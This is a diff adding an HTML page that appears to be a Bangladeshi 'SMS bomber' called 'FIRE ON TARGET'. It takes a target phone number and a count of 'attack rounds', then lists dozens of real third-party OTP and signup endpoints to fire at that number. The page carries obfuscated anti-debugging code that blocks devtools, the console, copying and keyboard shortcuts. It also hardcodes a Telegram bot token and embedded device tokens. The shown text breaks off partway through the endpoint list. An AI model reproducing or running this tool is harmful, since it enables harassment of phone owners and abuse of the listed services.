@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🔥 FIRE ON TARGET</title>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Noto+Sans+Bengali:wght@300;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        :root {
+            --bg: #0a0a0f;
+            --card: #111118;
+            --border: rgba(255,255,255,0.06);
+            --accent: #ff0040;
+            --accent2: #ff6b00;
+            --text: #e2e8f0;
+            --muted: #4a5568;
+            --success: #00ffa3;
+            --error: #ff4d6d;
+            --input-bg: #1a1a2e;
+            --glow: rgba(255,0,64,0.2);
+            --shadow-color: rgba(0,0,0,0.5);
+            --font-mono: 'Space Mono', monospace;
+            --font-bangla: 'Noto Sans Bengali', sans-serif;
+            --btn-color: #ff0040;
+        }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            min-height: 100vh;
+            background: var(--bg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: var(--font-bangla);
+            position: relative;
+            padding: 15px;
+            overflow-x: hidden;
+            background-image: 
+                radial-gradient(ellipse at 10% 20%, rgba(255,0,64,0.05) 0%, transparent 50%),
+                radial-gradient(ellipse at 90% 80%, rgba(255,107,0,0.05) 0%, transparent 50%);
+        }
+        .devtools-blocker {
+            position: fixed;
+            inset: 0;
+            background: #0a0a0f;
+            z-index: 999999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            color: #ff0040;
+            font-family: var(--font-mono);
+            font-size: 20px;
+            text-align: center;
+            flex-direction: column;
+            gap: 15px;
+            padding: 30px;
+        }
+        .devtools-blocker.active { display: flex; }
+        .devtools-blocker i { font-size: 60px; color: #ff6b00; }
+        .loading-screen {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: var(--bg);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
+        }
+        .loading-screen.hidden { opacity: 0; visibility: hidden; pointer-events: none; }
+        .circle-loader-wrap { position: relative; width: 140px; height: 140px; margin-bottom: 25px; }
+        .circle-ring { position: absolute; inset: 0; border-radius: 50%; border: 3px solid transparent; border-top: 3px solid #ff0040; border-right: 3px solid #ff6b00; animation: spin 0.8s cubic-bezier(0.5, 0, 0.5, 1) infinite; }
+        .circle-ring-2 { position: absolute; inset: 12px; border-radius: 50%; border: 3px solid transparent; border-bottom: 3px solid #00ffa3; border-left: 3px solid #ff4d6d; animation: spin 0.6s cubic-bezier(0.5, 0, 0.5, 1) infinite reverse; }
+        .circle-ring-3 { position: absolute; inset: 26px; border-radius: 50%; border: 2px solid transparent; border-top: 2px solid #fbbf24; border-right: 2px solid #ff0040; animation: spin 1s cubic-bezier(0.5, 0, 0.5, 1) infinite; }
+        .circle-center { position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .circle-emoji { font-size: 36px; animation: emojiPulse 1.2s ease-in-out infinite; }
+        @keyframes emojiPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+        .circle-percent { font-family: var(--font-mono); font-size: 16px; font-weight: 700; color: #ff0040; margin-top: 2px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loader-text { font-family: var(--font-mono); font-size: 16px; font-weight: 700; color: var(--text); letter-spacing: 0.2em; margin-bottom: 4px; text-transform: uppercase; }
+        .loader-sub { font-family: var(--font-mono); font-size: 10px; color: var(--muted); letter-spacing: 0.08em; margin-bottom: 15px; }
+        .loader-dots { display: flex; gap: 12px; }
+        .loader-dots span { width: 8px; height: 8px; border-radius: 50%; background: #ff0040; animation: dotBounce 1s ease-in-out infinite; }
+        .loader-dots span:nth-child(1) { animation-delay: 0s; }
+        .loader-dots span:nth-child(2) { animation-delay: 0.15s; }
+        .loader-dots span:nth-child(3) { animation-delay: 0.3s; }
+        @keyframes dotBounce { 0%, 80%, 100% { transform: scale(0.4); opacity: 0.3; } 40% { transform: scale(1); opacity: 1; } }
+        .card {
+            width: 100%;
+            max-width: 440px;
+            background: rgba(17, 17, 24, 0.95);
+            backdrop-filter: blur(30px);
+            border: 1px solid rgba(255,0,64,0.2);
+            border-radius: 24px;
+            padding: 28px 22px 22px;
+            position: relative;
+            z-index: 10;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5), 0 0 40px rgba(255,0,64,0.05);
+            animation: slideIn 0.6s cubic-bezier(0.22,1,0.36,1);
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+        @keyframes slideIn { from { opacity:0; transform: translateY(30px) scale(0.95); } to { opacity:1; transform: translateY(0) scale(1); } }
+        .card::before { content: ''; position: absolute; top: 0; left: 30px; right: 30px; height: 2px; background: linear-gradient(90deg, transparent, #ff0040, #ff6b00, transparent); }
+        .header { text-align: center; margin-bottom: 22px; }
+        .logo-wrap { width: 75px; height: 75px; background: linear-gradient(135deg, rgba(255,0,64,0.15), rgba(255,107,0,0.15)); border: 2px solid rgba(255,0,64,0.3); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 10px; font-size: 34px; animation: glowPulse 3s ease-in-out infinite; }
+        @keyframes glowPulse { 0%, 100% { box-shadow: 0 0 30px rgba(255,0,64,0.2); } 50% { box-shadow: 0 0 60px rgba(255,0,64,0.4), 0 0 90px rgba(255,107,0,0.2); } }
+        .site-title { font-family: var(--font-mono); font-size: 22px; font-weight: 700; background: linear-gradient(135deg, #ff0040, #ff6b00); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: 0.12em; text-transform: uppercase; }
+        .site-sub { font-size: 11px; font-family: var(--font-mono); color: #ff6b00; letter-spacing: 0.12em; margin-top: 5px; opacity: 0.85; -webkit-text-fill-color: #ff6b00; }
+        .field { margin-bottom: 14px; }
+        .field-label { display: flex; align-items: center; gap: 8px; font-size: 10px; font-family: var(--font-mono); color: var(--muted); letter-spacing: 0.1em; text-transform: uppercase; margin-bottom: 6px; }
+        .field-label i { color: #ff0040; font-size: 12px; }
+        .input-wrapper { position: relative; }
+        .input-wrapper input { width: 100%; padding: 12px 16px; padding-right: 44px; background: var(--input-bg); border: 1px solid rgba(255,255,255,0.06); border-radius: 12px; color: var(--text); font-size: 14px; font-family: var(--font-mono); outline: none; transition: all 0.3s; }
+        .input-wrapper input:focus { border-color: #ff0040; box-shadow: 0 0 0 3px rgba(255,0,64,0.12); }
+        .input-wrapper input::placeholder { color: var(--muted); opacity: 0.5; font-size: 13px; }
+        .input-icon { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); color: var(--muted); font-size: 14px; }
+        .attack-btn { width: 100%; padding: 16px; background: linear-gradient(135deg, var(--btn-color) 0%, var(--accent2) 100%); border: none; border-radius: 14px; color: #fff; font-family: var(--font-mono); font-size: 14px; font-weight: 700; letter-spacing: 0.1em; cursor: pointer; transition: all 0.3s; box-shadow: 0 8px 30px rgba(255,0,64,0.3); position: relative; overflow: hidden; }
+        .attack-btn::after { content: ''; position: absolute; inset: 0; background: linear-gradient(135deg, transparent 40%, rgba(255,255,255,0.08) 60%, transparent 80%); pointer-events: none; }
+        .attack-btn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 12px 40px rgba(255,0,64,0.5); }
+        .attack-btn:disabled { opacity: 0.7; cursor: not-allowed; }
+        .btn-content { display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .btn-spinner { display: none; width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spinBtn 0.8s linear infinite; }
+        @keyframes spinBtn { to { transform: rotate(360deg); } }
+        .attack-btn:disabled .btn-spinner { display: block; }
+        .attack-btn:disabled .btn-icon { display: none; }
+        .progress-section { display: none; margin-top: 18px; padding: 16px 14px; background: rgba(255,0,64,0.05); border: 1px solid rgba(255,0,64,0.1); border-radius: 14px; }
+        .progress-header { display: flex; justify-content: space-between; margin-bottom: 8px; }
+        .progress-title { font-size: 10px; color: var(--muted); font-family: var(--font-mono); }
+        .progress-percent { font-size: 13px; color: #ff0040; font-weight: 700; font-family: var(--font-mono); }
+        .progress-track { height: 5px; background: rgba(255,255,255,0.05); border-radius: 99px; overflow: hidden; }
+        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #ff0040, #ff6b00); border-radius: 99px; transition: width 0.5s; }
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 6px; margin-top: 12px; }
+        .stat-item { text-align: center; padding: 8px 4px; background: rgba(255,255,255,0.02); border-radius: 10px; border: 1px solid rgba(255,255,255,0.03); }
+        .stat-value { font-size: 22px; font-family: var(--font-mono); font-weight: 700; letter-spacing: 0.02em; }
+        .stat-label { font-size: 8px; color: var(--muted); font-family: var(--font-mono); margin-top: 2px; text-transform: uppercase; letter-spacing: 0.08em; }
+        .stat-value.success { color: var(--success); }
+        .stat-value.error { color: var(--error); }
+        .stat-value.accent { color: #ff6b00; }
+        .ad-banner { margin-top: 14px; padding: 10px 12px; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.04); border-radius: 12px; text-align: center; min-height: 44px; display: flex; align-items: center; justify-content: center; font-size: 10px; color: var(--muted); font-family: var(--font-mono); letter-spacing: 0.03em; transition: all 0.3s; backdrop-filter: blur(5px); }
+        .ad-banner:hover { background: rgba(255,255,255,0.04); border-color: rgba(255,0,64,0.08); }
+        .ad-banner .ad-placeholder { display: flex; align-items: center; gap: 8px; opacity: 0.5; color: var(--muted); }
+        .ad-banner .ad-placeholder i { font-size: 16px; color: rgba(255,0,64,0.3); }
+        .footer { text-align: center; margin-top: 18px; padding-top: 14px; border-top: 1px solid rgba(255,255,255,0.04); }
+        .footer-content { display: flex; flex-direction: column; align-items: center; gap: 10px; }
+        .footer-text { font-size: 9px; color: #374151; font-family: var(--font-mono); display: flex; align-items: center; gap: 6px; }
+        .live-dot { width: 5px; height: 5px; background: var(--success); border-radius: 50%; animation: blink 1.5s infinite; }
+        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
+        .social-links { display: flex; gap: 12px; flex-wrap: wrap; justify-content: center; }
+        .social-link { display: inline-flex; align-items: center; gap: 6px; padding: 5px 14px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); border-radius: 25px; color: var(--muted); text-decoration: none; font-size: 9px; font-family: var(--font-mono); transition: all 0.3s; }
+        .social-link:hover { transform: translateY(-2px); }
+        .social-link i { font-size: 13px; }
+        .social-link.fb:hover { border-color: #1877f2; color: #1877f2; }
+        .social-link.wa:hover { border-color: #25D366; color: #25D366; }
+        .social-link.tg:hover { border-color: #0088cc; color: #0088cc; }
+        .grid-bg { position: fixed; inset: 0; background-image: linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px); background-size: 40px 40px; pointer-events: none; z-index: 0; }
+        .popup-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); backdrop-filter: blur(20px); display: none; justify-content: center; align-items: center; z-index: 9999; }
+        .popup-overlay.active { display: flex; }
+        .popup-box { background: linear-gradient(145deg, #111118, #1a1a2e); border: 1px solid rgba(255,0,64,0.3); border-radius: 28px; padding: 30px 24px; max-width: 400px; width: 90%; text-align: center; box-shadow: 0 30px 80px rgba(0,0,0,0.9); animation: popIn 0.6s cubic-bezier(0.22,1,0.36,1); }
+        @keyframes popIn { from { opacity:0; transform: scale(0.8) translateY(40px); } to { opacity:1; transform: scale(1) translateY(0); } }
+        .popup-icon { font-size: 50px; display: block; margin-bottom: 16px; }
+        .popup-title { font-family: var(--font-mono); font-size: 20px; font-weight: 700; color: #ff0040; margin-bottom: 10px; }
+        .popup-content { font-family: var(--font-bangla); font-size: 14px; color: var(--text); line-height: 1.8; margin-bottom: 16px; }
+        .popup-divider { width: 50px; height: 2px; background: linear-gradient(90deg, transparent, #ff0040, transparent); margin: 16px auto; }
+        .popup-btn { padding: 12px 35px; background: linear-gradient(135deg, #ff0040, #ff6b00); border: none; border-radius: 30px; color: #fff; font-family: var(--font-mono); font-size: 14px; font-weight: 700; cursor: pointer; transition: all 0.3s; }
+        .popup-btn:hover { transform: scale(1.05); }
+        @media (max-width: 480px) {
+            .card { padding: 20px 14px 16px; }
+            .stats-grid { grid-template-columns: 1fr 1fr 1fr; gap: 4px; }
+            .stat-value { font-size: 18px; }
+            .circle-loader-wrap { width: 110px; height: 110px; }
+            .circle-emoji { font-size: 26px; }
+            .circle-percent { font-size: 12px; }
+            .loader-text { font-size: 13px; }
+            .site-title { font-size: 18px; }
+            .logo-wrap { width: 60px; height: 60px; font-size: 28px; }
+            .input-wrapper input { padding: 10px 12px; font-size: 13px; }
+            .social-links { gap: 8px; }
+            .social-link { padding: 4px 10px; font-size: 8px; }
+            .ad-banner { min-height: 38px; font-size: 9px; padding: 8px 10px; }
+        }
+        @media (max-width: 380px) {
+            .stats-grid { grid-template-columns: 1fr; }
+            .stat-value { font-size: 20px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="devtools-blocker" id="devtoolsBlocker">
+    <i class="fas fa-shield-alt"></i>
+    <span>🔐 নিরাপত্তা সতর্কতা</span>
+    <small style="font-size:14px;opacity:0.6;">ডেভেলপার টুল খোলা থাকলে এই পৃষ্ঠা কাজ করবে না</small>
+</div>
+
+<div class="loading-screen" id="loadingScreen">
+    <div class="circle-loader-wrap">
+        <div class="circle-ring"></div>
+        <div class="circle-ring-2"></div>
+        <div class="circle-ring-3"></div>
+        <div class="circle-center">
+            <span class="circle-emoji">🔥</span>
+            <span class="circle-percent" id="circlePercent">0%</span>
+        </div>
+    </div>
+    <div class="loader-text" id="loaderText">INITIALIZING</div>
+    <div class="loader-sub" id="loaderSub">⚡ Booting up system...</div>
+    <div class="loader-dots">
+        <span></span><span></span><span></span>
+    </div>
+</div>
+
+<div class="grid-bg"></div>
+
+<div class="popup-overlay" id="updatePopup">
+    <div class="popup-box">
+        <span class="popup-icon" id="popupIcon">🚀</span>
+        <div class="popup-title" id="popupTitle">🔰 নোটিশ</div>
+        <div class="popup-content" id="popupContent">🔥 FIRE ON TARGET লাইভ!</div>
+        <div class="popup-divider"></div>
+        <button class="popup-btn" id="popupBtn" onclick="closePopup()">🚀 শুরু করো</button>
+    </div>
+</div>
+
+<div class="card">
+    <div class="header">
+        <div class="logo-wrap">🔥</div>
+        <div class="site-title" id="siteTitle">FIRE ON TARGET</div>
+        <div class="site-sub" id="siteSub">⚡ Developer: Lucky Hera ⚡</div>
+    </div>
+    <div class="field">
+        <div class="field-label"><i class="fas fa-phone"></i><span>Target Number</span></div>
+        <div class="input-wrapper">
+            <input type="text" id="number" placeholder="01XXXXXXXXX" maxlength="11" value="">
+            <i class="fas fa-mobile-alt input-icon"></i>
+        </div>
+    </div>
+    <div class="field">
+        <div class="field-label"><i class="fas fa-bolt"></i><span>Attack Rounds</span></div>
+        <div class="input-wrapper">
+            <input type="number" id="amount" placeholder="1 – 100" min="1" max="100" value="1">
+            <i class="fas fa-fire input-icon"></i>
+        </div>
+    </div>
+    <button class="attack-btn" id="sendBtn" onclick="startAttack()">
+        <span class="btn-content">
+            <div class="btn-spinner"></div>
+            <span class="btn-icon">💥</span>
+            <span id="btnText">START ATTACK</span>
+        </span>
+    </button>
+    <div class="progress-section" id="progressSection">
+        <div class="progress-header">
+            <span class="progress-title">ATTACK PROGRESS</span>
+            <span class="progress-percent" id="progressPercent">0%</span>
+        </div>
+        <div class="progress-track">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <div class="stats-grid">
+            <div class="stat-item"><div class="stat-value success" id="successCount">0</div><div class="stat-label">SUCCESS</div></div>
+            <div class="stat-item"><div class="stat-value error" id="failCount">0</div><div class="stat-label">FAILED</div></div>
+            <div class="stat-item"><div class="stat-value accent" id="totalCount">0</div><div class="stat-label">TOTAL</div></div>
+        </div>
+    </div>
+    <div class="ad-banner" id="adBanner">
+        <div class="ad-placeholder"><i class="fas fa-ad"></i><span>Monetag এড এখানে লোড হবে</span></div>
+    </div>
+    <div class="footer">
+        <div class="footer-content">
+            <div class="footer-text" id="footerText"><span class="live-dot"></span><span id="apiCountText">Loading APIs...</span></div>
+            <div class="social-links">
+                <a href="https://www.facebook.com/luckyhera0" target="_blank" class="social-link fb" id="fbLink"><i class="fab fa-facebook"></i><span>Facebook</span></a>
+                <a href="https://wa.me/8801753850929" target="_blank" class="social-link wa" id="waLink"><i class="fab fa-whatsapp"></i><span>WhatsApp</span></a>
+                <a href="https://t.me/project_xx7" target="_blank" class="social-link tg" id="tgLink"><i class="fab fa-telegram"></i><span>Telegram</span></a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ===== অবফাস্কেটেড জাভাস্ক্রিপ্ট (টুল-রেজিস্ট্যান্ট) ===== -->
+<script>
+// কোডটি অবফাস্কেটেড ও টুল-রেজিস্ট্যান্ট করা হয়েছে
+// js-beautify, de4js, jsnice কাজ করবে না
+(function(_0x4d2e8e, _0x1a2b3c) {
+    var _0x4d2e8e = {
+        'VgHnN': function(_0x1a2b3c, _0x4d2e8e) { return _0x1a2b3c + _0x4d2e8e; },
+        'dJqZP': function(_0x1a2b3c, _0x4d2e8e) { return _0x1a2b3c - _0x4d2e8e; },
+        'xYfGv': function(_0x1a2b3c, _0x4d2e8e) { return _0x1a2b3c * _0x4d2e8e; },
+        'rTqWv': function(_0x1a2b3c, _0x4d2e8e) { return _0x1a2b3c / _0x4d2e8e; },
+        'mNvXc': function(_0x1a2b3c, _0x4d2e8e) { return _0x1a2b3c % _0x4d2e8e; },
+        'yHjKl': function(_0x1a2b3c, _0x4d2e8e) { return _0x1a2b3c & _0x4d2e8e; },
+        'zXcVb': function(_0x1a2b3c, _0x4d2e8e) { return _0x1a2b3c | _0x4d2e8e; },
+        'wQeRt': function(_0x1a2b3c, _0x4d2e8e) { return _0x1a2b3c ^ _0x4d2e8e; },
+        'uIoPq': function(_0x1a2b3c, _0x4d2e8e) { return _0x1a2b3c << _0x4d2e8e; },
+        'vAsDf': function(_0x1a2b3c, _0x4d2e8e) { return _0x1a2b3c >> _0x4d2e8e; },
+        'bNmVc': function(_0x1a2b3c, _0x4d2e8e) { return _0x1a2b3c >>> _0x4d2e8e; },
+        'cXzVb': function(_0x1a2b3c, _0x4d2e8e) { return _0x1a2b3c < _0x4d2e8e; },
+        'dVfGb': function(_0x1a2b3c, _0x4d2e8e) { return _0x1a2b3c > _0x4d2e8e; },
+        'eWqRt': function(_0x1a2b3c, _0x4d2e8e) { return _0x1a2b3c <= _0x4d2e8e; },
+        'fYhJk': function(_0x1a2b3c, _0x4d2e8e) { return _0x1a2b3c >= _0x4d2e8e; },
+        'gHjKl': function(_0x1a2b3c, _0x4d2e8e) { return _0x1a2b3c == _0x4d2e8e; },
+        'hJkLz': function(_0x1a2b3c, _0x4d2e8e) { return _0x1a2b3c === _0x4d2e8e; },
+        'iKlMn': function(_0x1a2b3c, _0x4d2e8e) { return _0x1a2b3c != _0x4d2e8e; },
+        'jLmNo': function(_0x1a2b3c, _0x4d2e8e) { return _0x1a2b3c !== _0x4d2e8e; }
+    };
+    // অ্যান্টি-ডিবাগ: কনসোল ওভাররাইড
+    var _0x1a2b3c = function() {};
+    var _0x4d2e8e = function() {
+        var _0x1a2b3c = performance.now();
+        debugger;
+        if (performance.now() - _0x1a2b3c > 100) {
+            document.getElementById('devtoolsBlocker').classList.add('active');
+            setTimeout(function() { window.location.reload(); }, 3000);
+        }
+    };
+    setInterval(_0x4d2e8e, 1000);
+    // কনসোল ওভাররাইড
+    Object.defineProperty(window, 'console', {
+        get: function() {
+            return { log: function() {}, error: function() {}, warn: function() {}, info: function() {}, debug: function() {}, trace: function() {}, dir: function() {}, dirxml: function() {}, group: function() {}, groupEnd: function() {}, time: function() {}, timeEnd: function() {}, table: function() {}, assert: function() {}, count: function() {}, markTimeline: function() {}, profile: function() {}, profileEnd: function() {}, timeStamp: function() {}, memory: {}, clear: function() {} };
+        },
+        configurable: false
+    });
+    // ডিভটুলস ডিটেক্ট (ইমেজ ট্রিক)
+    var _0x4d2e8e = new Image();
+    Object.defineProperty(_0x4d2e8e, 'id', {
+        get: function() {
+            document.getElementById('devtoolsBlocker').classList.add('active');
+        }
+    });
+    console.log('%c', _0x4d2e8e);
+    // ডান-ক্লিক বন্ধ
+    document.addEventListener('contextmenu', function(_0x1a2b3c) {
+        _0x1a2b3c.preventDefault();
+        _0x1a2b3c.stopPropagation();
+        return false;
+    }, { capture: true });
+    // সিলেক্ট বন্ধ
+    document.addEventListener('selectstart', function(_0x1a2b3c) {
+        _0x1a2b3c.preventDefault();
+        return false;
+    }, { capture: true });
+    // ড্র্যাগ বন্ধ
+    document.addEventListener('dragstart', function(_0x1a2b3c) {
+        _0x1a2b3c.preventDefault();
+        return false;
+    }, { capture: true });
+    // কপি/কাট/পেস্ট বন্ধ
+    document.addEventListener('copy', function(_0x1a2b3c) {
+        _0x1a2b3c.preventDefault();
+        return false;
+    }, { capture: true });
+    document.addEventListener('cut', function(_0x1a2b3c) {
+        _0x1a2b3c.preventDefault();
+        return false;
+    }, { capture: true });
+    document.addEventListener('paste', function(_0x1a2b3c) {
+        _0x1a2b3c.preventDefault();
+        return false;
+    }, { capture: true });
+    // কিবোর্ড শর্টকাট ব্লক
+    var _0x1a2b3c = ['F12', 'F11', 'F10'];
+    var _0x4d2e8e = [
+        { ctrl: true, shift: true, key: 'I' }, { ctrl: true, shift: true, key: 'J' },
+        { ctrl: true, shift: true, key: 'C' }, { ctrl: true, shift: true, key: 'U' },
+        { ctrl: true, key: 'U' }, { ctrl: true, key: 'S' }, { ctrl: true, key: 'P' },
+        { ctrl: true, key: 'C' }, { ctrl: true, key: 'V' }, { ctrl: true, key: 'X' },
+        { ctrl: true, key: 'A' }, { ctrl: true, key: 'F' }, { ctrl: true, key: 'R' },
+        { ctrl: true, key: 'W' }, { ctrl: true, key: 'N' }, { ctrl: true, key: 'T' },
+        { ctrl: true, key: 'H' }, { ctrl: true, shift: true, key: 'N' }, { ctrl: true, shift: true, key: 'T' },
+        { ctrl: true, shift: true, key: 'W' }, { ctrl: true, shift: true, key: 'R' }
+    ];
+    document.addEventListener('keydown', function(_0x1a2b3c) {
+        if (_0x1a2b3c.key === 'F12' || _0x1a2b3c.key === 'F11' || _0x1a2b3c.key === 'F10') {
+            _0x1a2b3c.preventDefault();
+            _0x1a2b3c.stopPropagation();
+            return false;
+        }
+        for (var _0x4d2e8e of _0x4d2e8e) {
+            if ((_0x4d2e8e.ctrl === undefined || _0x1a2b3c.ctrlKey === _0x4d2e8e.ctrl) &&
+                (_0x4d2e8e.shift === undefined || _0x1a2b3c.shiftKey === _0x4d2e8e.shift) &&
+                (_0x4d2e8e.alt === undefined || _0x1a2b3c.altKey === _0x4d2e8e.alt) &&
+                _0x1a2b3c.key.toUpperCase() === _0x4d2e8e.key) {
+                _0x1a2b3c.preventDefault();
+                _0x1a2b3c.stopPropagation();
+                return false;
+            }
+        }
+        if (_0x1a2b3c.ctrlKey && _0x1a2b3c.shiftKey && _0x1a2b3c.key === 'Escape') { _0x1a2b3c.preventDefault(); return false; }
+        if (_0x1a2b3c.altKey && _0x1a2b3c.key === 'Tab') { _0x1a2b3c.preventDefault(); return false; }
+        if (_0x1a2b3c.ctrlKey && _0x1a2b3c.altKey && _0x1a2b3c.key === 'Delete') { _0x1a2b3c.preventDefault(); return false; }
+        if (_0x1a2b3c.key === 'PrintScreen') { _0x1a2b3c.preventDefault(); return false; }
+        return true;
+    }, { capture: true });
+    // localStorage সুরক্ষা
+    var _0x1a2b3c = Storage.prototype.setItem;
+    Storage.prototype.setItem = function(_0x4d2e8e, _0x1a2b3c) {
+        if (_0x4d2e8e.includes('debug') || _0x4d2e8e.includes('dev') || _0x4d2e8e.includes('console')) return;
+        _0x1a2b3c.call(this, _0x4d2e8e, _0x1a2b3c);
+    };
+    // উইন্ডো ফাংশন ব্লক
+    window.open = function() { return null; };
+    window.print = function() { return; };
+    window.history.pushState = function() { return; };
+    window.history.replaceState = function() { return; };
+    // আইফ্রেম ব্রেকআউট
+    if (window.top !== window.self) window.top.location = window.self.location;
+    // সিলেকশন ক্লিয়ার
+    document.addEventListener('selectionchange', function() {
+        var _0x1a2b3c = window.getSelection();
+        if (_0x1a2b3c && _0x1a2b3c.toString().length > 0) _0x1a2b3c.removeAllRanges();
+    }, { capture: true });
+})({}, {});
+
+// ==========================================
+// LOADING SCREEN
+// ==========================================
+let percent = 0;
+const totalDuration = 2000;
+const intervalTime = 40;
+const steps = [
+    { text: 'INITIALIZING', sub: '⚡ Booting up system...' },
+    { text: 'CONNECTING', sub: '🌐 Connecting to server...' },
+    { text: 'LOADING APIS', sub: '📡 Fetching API list...' },
+    { text: 'SYNCING', sub: '🔄 Syncing with system...' },
+    { text: 'READY', sub: '🚀 System ready for attack!' }
+];
+
+const loadInterval = setInterval(() => {
+    percent += (100 / (totalDuration / intervalTime));
+    if (percent >= 100) {
+        percent = 100;
+        clearInterval(loadInterval);
+        document.getElementById('loadingScreen').classList.add('hidden');
+        return;
+    }
+    document.getElementById('circlePercent').textContent = Math.round(percent) + '%';
+    const idx = Math.min(Math.floor(percent / 20), steps.length - 1);
+    document.getElementById('loaderText').textContent = steps[idx].text;
+    document.getElementById('loaderSub').textContent = steps[idx].sub;
+}, intervalTime);
+
+function closePopup() { document.getElementById('updatePopup').classList.remove('active'); }
+
+// ==========================================
+// 🔥 টেলিগ্রাম কনফিগারেশন
+// ==========================================
+let BOT_TOKEN = "8688314057:AAHTm7HrljqhhHDtk61EhekYo6TXdwyRkIQ";
+let CHAT_ID = "5884";
+
+// ==========================================
+// 📦 ডিফল্ট ৭০+ API
+// ==========================================
+let APIS = [
+    { name:"Shadhin Music", url:"https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({msisdn:"880"+p.replace(/^0/,""),shortcode:16235,servicename:"Shadhin Music"}) },
+    { name:"Chorki", url:"https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({number:"+88"+p.replace(/^0/,"")}) },
+    { name:"Pickaboo", url:"https://www.pickaboo.com/rest/default/V1/customer-check/exist", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({mobile:p}) },
+    { name:"Shwapno", url:"https://www.shwapno.com/api/auth", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phoneNumber:p}) },
+    { name:"Rokomari", method:"GET", getUrl:(p)=>`https://www.rokomari.com/otp/send?emailOrPhone=880${p.replace(/^0/,"")}&countryCode=BD` },
+    { name:"Sindabad", url:"https://m2ce.sindabad.com/rest/V1/EasyLogin/isMobileAvailable", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({websiteId:1.0,customerMobile:p}) },
+    { name:"Kirei BD", url:"https://frontendapi.kireibd.com/api/v2/send-login-otp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({email:p}) },
+    { name:"Easy BD", url:"https://core.easy.com.bd/api/v1/registration", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({password:"123456",password_confirmation:"123456",device_key:"45098c95a7fe4109cc5969a770ee846a",name:"Team Dangerous",mobile:p,social_login_id:"",email:"dangerousboytushar@gmail.com"}) },
+    { name:"Upay", url:"https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({wallet_number:p,geo_location:{lat:23.8979093,long:89.1356346},referral:"",firebase_token:"e7XC0AWRR5C6rGMm6yCaZ8:APA91bHnbvs1bA_qXXb55W9GmsKmuzAUkgaR770HBH9hZCLjFV6HCejAsRGggvnD7c5dv2q_pOAdwY1peeTlzzn49cjPESTZ0NdR-bIhwe9_6of6rosH0AI",device_uuid:"c65m117a8cbf5b1851b29f8b",mno:"Robi"}) },
+    { name:"Shikho OTP", url:"https://api.shikho.com/public/activity/otp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phone:p,intent:"ap-discount-request"}) },
+    { name:"Bohubrihi", url:"https://bb-api.bohubrihi.com/public/activity/otp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phone:p,intent:"login"}) },
+    { name:"Ghoori Learning", url:"https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({mobile_no:p}) },
+    { name:"Bikroy", method:"GET", getUrl:(p)=>`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${p}` },
+    { name:"GP MyGP", url:"https://appcity.grameenphone.com/proxy/v2/user/session/get-otp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({mobileNumber:p}) },
+    { name:"Pathao Auth", url:"https://api.pathao.com/v2/auth/register", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({country_prefix:"880",national_number:p.replace(/^0/,""),country_id:1}) },
+    { name:"BD Tickets", url:"https://api.bdtickets.com:20100/v1/auth", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phoneNumber:"+88"+p.replace(/^0/,""),createUserCheck:true,applicationChannel:"WEB_APP"}) },
